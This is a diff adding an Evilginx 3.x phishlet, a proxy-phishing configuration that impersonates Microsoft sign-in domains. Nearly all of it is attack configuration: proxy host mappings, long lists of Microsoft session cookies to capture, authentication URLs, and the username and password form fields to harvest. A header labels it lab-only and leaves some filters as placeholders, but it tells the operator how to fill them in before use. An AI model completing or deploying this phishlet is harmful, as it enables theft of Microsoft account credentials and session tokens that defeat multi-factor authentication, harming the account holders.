@@ -1,0 +1,133 @@
+# Evilginx 3.x Phishlet
+# Generated from lab capture - AUTHORIZED LAB USE ONLY
+# Operator must complete: sub_filters (JS proxy-rewrite recipes)
+# This is NOT a guaranteed working deployment against any live IdP
+#
+# credentials filled from earlier capture (login.live.com password form:
+#   <input name="loginfmt" type="hidden"> + <input name="passwd" type="password">)
+# Replace search: '{{PLACEHOLDER}}' with '(.*)' for each credential before use.
+
+name: 'lab-target'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - phish_sub: 'login'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: 'login'
+    orig_sub: 'login'
+    domain: 'live.com'
+    session: true
+    is_landing: true
+    auto_filter: true
+  - phish_sub: 'logincdn'
+    orig_sub: 'logincdn'
+    domain: 'msauth.net'
+    session: false
+    is_landing: false
+    auto_filter: true
+  - phish_sub: 'account'
+    orig_sub: 'account'
+    domain: 'microsoft.com'
+    session: true
+    is_landing: false
+    auto_filter: true
+
+auth_tokens:
+  - domain: 'microsoftonline.com'
+    keys:
+      - 'fpc'
+      - 'x-ms-gateway-slice'
+      - 'market'
+      - 'AMC-MS-CV'
+      - 'GRNID'
+      - 'bm_sv'
+      - 'stsservicecookie'
+  - domain: 'live.com'
+    keys:
+      - 'MSPRequ'
+      - 'uaid'
+      - 'MSPOK'
+      - 'OParams'
+      - 'OParams1'
+      - '__Host-MSAAUTH'
+      - '__Host-MSAAUTHP'
+      - 'PPLState'
+      - 'MSPShared'
+      - 'MSPPre'
+      - 'MSPCID'
+      - 'MSPAuth'
+      - 'MSPProf'
+      - 'NAP'
+      - 'ANON'
+      - 'pres'
+      - 'LOpt'
+      - 'WLSSC'
+      - 'SDIDC'
+      - 'MSPOAuthVis'
+      - 'JSH'
+      - 'MSPBack'
+  - domain: 'microsoft.com'
+    keys:
+      - 'market'
+      - 'AMC-MS-CV'
+      - 'GRNID'
+      - 'bm_sv'
+      - 'uaid'
+      - 'MSPRequ'
+      - '__Host-MSAAUTH'
+      - '__Host-MSAAUTHP'
+      - 'PPLState'
+      - 'MSPShared'
+      - 'MSPPre'
+      - 'MSPCID'
+      - 'MSPVis'
+      - 'MSPVisNet'
+      - 'MSPNSVis'
+      - 'MSPNSVisNet'
+      - 'MSPAPPVis'
+      - 'MSPAPPVisNet'
+      - 'JSH'
+      - 'MSPSoftVis'
+      - 'OParams'
+      - 'OParams1'
+      - 'MSPBack'
+      - 's.SessID'
+      - 's.cachemap'
+      - 's.DCLoc'
+      - 'x-portal-routekey'
+
+auth_urls:
+  - '/common/GetCredentialType'
+  - '/oauth20_authorize.srf'
+  - '/checkpassword.srf'
+  - '/auth/complete-signin-oauth'
+  - '/auth/complete-client-signin-oauth-silent'
+  - '/consumers/oauth2/v2.0/authorize'
+  - '/auth/complete-client-signin-oauth'
+  - '/auth/complete-client-signin-oauth-redirect'
+  - '/consumers/oauth2/v2.0/token'
+  - '/auth/complete-sso-with-redirect'
+  - '/login.srf'
+  - '/auth/complete-silent-signin'
+  - '/auth/acquire-onbehalf-of-token'
+
+login:
+  domain: 'live.com'
+  path: '/ppsecure/post.srf'
+  username: 'loginfmt'
+  password: 'passwd'
+
+credentials:
+  - key: 'loginfmt'
+    search: '{{PLACEHOLDER}}'
+    type: 'username'
+  - key: 'passwd'
+    search: '{{PLACEHOLDER}}'
+    type: 'password'
+
+sub_filters:
+  - '{{PLACEHOLDER}}'
